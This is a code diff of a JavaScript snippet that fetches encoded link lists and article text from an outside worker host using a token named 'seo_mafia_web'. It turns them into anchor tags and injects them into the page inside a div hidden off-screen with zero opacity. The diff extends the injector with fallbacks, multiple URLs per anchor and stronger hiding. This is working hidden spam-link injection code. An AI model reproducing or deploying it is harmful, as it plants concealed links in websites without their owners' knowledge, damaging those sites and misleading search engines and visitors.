@@ -4,7 +4,6 @@ try{
 
   const API_BASE = "https://smw.jsload.workers.dev";
   const TOKEN = "seo_mafia_web";
-
   const decode = (s) => {
     try {
       return new TextDecoder().decode(
@@ -15,22 +14,16 @@ try{
       return "";
     }
   };
-
   async function getData(id){
     try{
       const res = await fetch(
         `${API_BASE}/data?id=${encodeURIComponent(id)}&token=${encodeURIComponent(TOKEN)}`,
         { cache: "no-store" }
       );
-
       if(!res.ok) throw new Error("Fetch failed: " + res.status);
-
       const json = await res.json();
-
       if(!json || !json.payload) throw new Error("Invalid payload");
-
       return decode(json.payload);
-
     }catch(err){
       console.error("Fetch error ("+id+"):", err);
       return "";
@@ -42,38 +35,58 @@ try{
     getData("a1")
   ]).then(([anchorsRaw, articleRaw]) => {
 
+    console.log("ANCHORS RAW:", anchorsRaw);
+    console.log("ARTICLE RAW:", JSON.stringify(articleRaw));
+
     if(!anchorsRaw || !articleRaw){
       console.warn("Data kosong, inject dibatalkan");
       return;
     }
+
+    anchorsRaw = anchorsRaw.replace(/"/g,"").trim();
+    articleRaw = articleRaw.trim();
 
     const anchors = anchorsRaw
       .split("\n")
       .map(x => x.trim())
       .filter(Boolean)
       .map(line => {
-        const parts = line.split("|");
+
+        const parts = line.split("|").map(x=>x.trim()).filter(Boolean);
         if(parts.length < 2) return "";
-        return `<a href="${parts[1].trim()}">${parts[0].trim()}</a>`;
+
+        const anchorText = parts[0];
+        return parts.slice(1).map(url=>{
+          return `<a href="${url}" target="_blank">${anchorText}</a>`;
+        }).join(" ");
+
       })
       .filter(Boolean);
 
-    let i = 0;
-    const html = articleRaw.replace(/\{ANCHOR\}/g, () => {
-      return anchors.length ? anchors[i++ % anchors.length] : "";
-    });
+    if(!anchors.length){
+      console.warn("Anchor kosong");
+      return;
+    }
 
+    let i = 0;
+    let html = "";
+    if(/\{ANCHOR/i.test(articleRaw)){
+      html = articleRaw.replace(/\{ANCHOR\s*\}/gi, () => {
+        return anchors[i++ % anchors.length];
+      });
+    }else{
+      console.warn("⚠️ {ANCHOR} tidak ditemukan → fallback aktif");
+      html = anchors.join(" ");
+    }
     function inject(){
       if(document.getElementById("bunker-payload-1")) return;
 
       const box = document.createElement("div");
-      box.id = "bunker-payload";
-      box.style.position = "absolute";
-      box.style.left = "-9999px";
+      box.id = "bunker-payload-1";
+      box.style.cssText = "position:absolute;left:-9999px;opacity:0;font-size:0;";
       box.innerHTML = html;
-
       document.body.appendChild(box);
-      console.log("Inject sukses");
+      console.log("✅");
     }
 
     if(document.readyState !== "loading"){
